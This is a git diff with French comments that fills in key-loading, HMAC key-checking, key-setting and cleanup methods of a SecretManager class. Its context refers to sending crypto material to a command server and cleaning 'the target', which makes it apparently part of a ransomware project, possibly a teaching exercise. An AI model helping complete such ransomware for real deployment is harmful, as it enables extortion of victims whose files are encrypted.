@@ -9,6 +9,8 @@ import base64
 
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+from cryptography.hazmat.primitives import hmac
+
 
 from xorcrypt import xorfile
 from pathlib import Path
@@ -91,17 +93,35 @@ class SecretManager:
             salt_file.write(salt)
 
         # Envoyer les éléments cryptographiques au CN
-    def load(self)->None:
-        # function to load crypto data
-        raise NotImplemented()
 
-    def check_key(self, candidate_key:bytes)->bool:
-        # Assert the key is valid
-        raise NotImplemented()
+    def load(self) -> None:
+        # Charger le salt depuis le fichier salt.bin
+        salt_path = os.path.join(self._path, "salt.bin")
+        with open(salt_path, "rb") as f:
+            self._salt = f.read()
 
-    def set_key(self, b64_key:str)->None:
-        # If the key is valid, set the self._key var for decrypting
-        raise NotImplemented()
+        # Charger le token depuis le fichier token.bin
+        token_path = os.path.join(self._path, "token.bin")
+        with open(token_path, "rb") as f:
+            self._token = f.read()
+
+    def check_key(self, candidate_key: bytes) -> bool:
+        h = hmac.HMAC(self._salt, hashes.SHA256())
+        h.update(candidate_key)
+        hmac_result = h.finalize()
+
+        # Vérifiez que le HMAC du token correspond à celui calculé avec la clé candidate
+        return hmac_result == self._token
+
+    def set_key(self, b64_key: str) -> None:
+        # Décoder la clé candidate en base64
+        candidate_key = base64.b64decode(b64_key)
+
+        # Vérifiez que la clé candidate est correcte
+        if self.check_key(candidate_key):
+            self._key = candidate_key
+        else:
+            raise ValueError("La clé fournie est incorrecte.")
 
     def get_hex_token(self) -> str:
         # Hacher le token avec SHA-256
@@ -126,8 +146,15 @@ class SecretManager:
         raise NotImplemented()
 
     def clean(self):
-        # remove crypto data from the target
-        raise NotImplemented()
+        # Supprimer le fichier token.bin
+        token_path = os.path.join(self._path, "token.bin")
+        if os.path.exists(token_path):
+            os.remove(token_path)
+
+        # Supprimer le fichier salt.bin
+        salt_path = os.path.join(self._path, "salt.bin")
+        if os.path.exists(salt_path):
+            os.remove(salt_path)
     
 
     
